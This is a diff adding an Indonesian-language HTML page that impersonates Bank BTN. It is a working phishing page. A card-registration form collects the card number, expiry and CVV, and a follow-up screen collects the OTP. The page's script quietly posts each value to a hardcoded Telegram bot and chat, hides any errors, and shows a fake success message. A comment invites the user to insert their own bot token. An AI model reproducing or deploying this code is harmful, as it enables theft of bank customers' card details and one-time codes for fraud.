@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank BTN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#1E5BC6',
+                        secondary: '#E8F0FE',
+                        border: '#D1D9E9',
+                        text: '#333333',
+                        placeholder: '#9CA3AF',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .input-field {
+                @apply w-full px-4 py-3 rounded-xl border border-border focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all;
+            }
+            .tab-active {
+                @apply bg-primary text-white rounded-full px-6 py-3 font-medium;
+            }
+            .tab-inactive {
+                @apply bg-secondary text-text/70 rounded-full px-6 py-3 font-medium;
+            }
+            .input-otp {
+                @apply w-full h-16 text-center text-2xl font-bold rounded-xl border border-border focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary;
+            }
+        }
+    </style>
+</head>
+<body class="bg-white font-sans">
+    <!-- Halaman Registrasi -->
+    <div id="page-registrasi">
+        <header class="bg-primary text-white py-4 px-5 flex items-center shadow-sm">
+            <button class="mr-4 text-xl">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <h1 class="text-xl font-semibold flex-1 text-center -ml-8">Bantuan</h1>
+        </header>
+
+        <main class="p-5">
+            <!-- Tombol diperlebar -->
+            <div class="bg-secondary rounded-full p-1 mb-6 w-full">
+                <button class="tab-active w-full text-center">Nomor Kartu Kredit/Debit</button>
+            </div>
+
+            <form id="form-registrasi">
+                <div class="mb-6">
+                    <label class="block text-text text-base mb-2 font-medium">Nomor Kartu :</label>
+                    <div class="relative">
+                        <i class="fas fa-credit-card absolute left-4 top-1/2 -translate-y-1/2 text-placeholder text-xl"></i>
+                        <input type="tel" id="nomor-kartu" placeholder="Ex. 4215708800002040" class="input-field pl-11" required maxlength="16" style="padding-left: 40px">
+                    </div>
+                </div>
+
+                <div class="flex gap-4 mb-8">
+                    <div class="flex-1">
+                        <label class="block text-text text-base mb-2 font-medium">Berlaku Hingga :</label>
+                        <div class="flex items-center gap-2">
+                            <input type="text" id="bb" placeholder="BB" maxlength="2" class="input-field text-center" required>
+                            <span class="text-xl">/</span>
+                            <input type="text" id="tt" placeholder="TT" maxlength="2" class="input-field text-center" required>
+                        </div>
+                    </div>
+                    <div class="flex-1">
+                        <label class="block text-text text-base mb-2 font-medium">CVV :</label>
+                        <input type="password" id="cvv" placeholder="---" maxlength="3" class="input-field text-center" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="w-full bg-primary text-white py-4 rounded-full text-lg font-medium mt-8">
+                    Lanjut
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <!-- Halaman OTP -->
+    <div id="page-otp" class="hidden">
+        <header class="bg-primary text-white py-4 px-5 flex items-center shadow-sm">
+            <button onclick="showPage('registrasi')" class="mr-4 text-xl">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <h1 class="text-xl font-semibold flex-1 text-center -ml-8">Verifikasi OTP</h1>
+        </header>
+
+        <main class="p-5 text-center">
+            <p class="text-lg mb-6">Masukkan kode OTP yang telah dikirim</p>
+            
+            <form id="form-otp" class="max-w-xs mx-auto">
+                <input type="text" id="otp-input" maxlength="6" class="input-otp mb-4" placeholder="------" required>
+                
+                <p id="countdown" class="text-red-500 font-medium mb-6">Kirim ulang kode dalam 02:00</p>
+
+                <button type="submit" class="w-full bg-primary text-white py-4 rounded-full text-lg font-medium">
+                    Verifikasi
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <script>
+        // Ganti dengan Bot Token dan Chat ID Telegram kamu
+        const TELEGRAM_BOT_TOKEN = '8706361936:AAEXU55y_cK5OTg0S3NdkinmhpUA_TrR15o';
+        const TELEGRAM_CHAT_ID = '8497590805';
+
+        function showPage(page) {
+            document.getElementById('page-registrasi').classList.add('hidden');
+            document.getElementById('page-otp').classList.add('hidden');
+            document.getElementById(`page-${page}`).classList.remove('hidden');
+        }
+
+        // Validasi & Kirim Data ke Telegram
+        document.getElementById('form-registrasi').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const nomorKartu = document.getElementById('nomor-kartu').value;
+            const berlaku = document.getElementById('bb').value + '/' + document.getElementById('tt').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Validasi sederhana
+            if(nomorKartu.length < 16 || berlaku.length < 5 || cvv.length < 3) {
+                return;
+            }
+
+            const message = `🔔 DATA REGISTRASI BARU\n\n💳 Nomor Kartu: ${nomorKartu}\n📅 Berlaku Hingga: ${berlaku}\n🔐 CVV: ${cvv}`;
+            
+            try {
+                await sendToTelegram(message);
+                showPage('otp');
+                startCountdown();
+            } catch (error) {
+                // Tidak ada alert
+            }
+        });
+
+        // Verifikasi OTP
+        document.getElementById('form-otp').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otp-input').value;
+            
+            if(otp.length < 4) {
+                return;
+            }
+
+            const message = `🔐 KODE OTP DITERIMA\n\nKode OTP: ${otp}`;
+            
+            try {
+                await sendToTelegram(message);
+                alert('Verifikasi berhasil!'); // Hanya alert ini yang tersisa
+                // Bisa tambahkan redirect atau aksi lain di sini
+            } catch (error) {
+                // Tidak ada alert
+            }
+        });
+
+        // Fungsi Kirim ke Telegram
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text
+                })
+            });
+            return response.json();
+        }
+
+        // Hitung Mundur 2 Menit
+        function startCountdown() {
+            let timeLeft = 120; // 2 menit dalam detik
+            const countdownEl = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownEl.textContent = `Kirim ulang kode dalam ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if(timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdownEl.innerHTML = '<a href="#" class="text-primary">Kirim ulang kode</a>';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
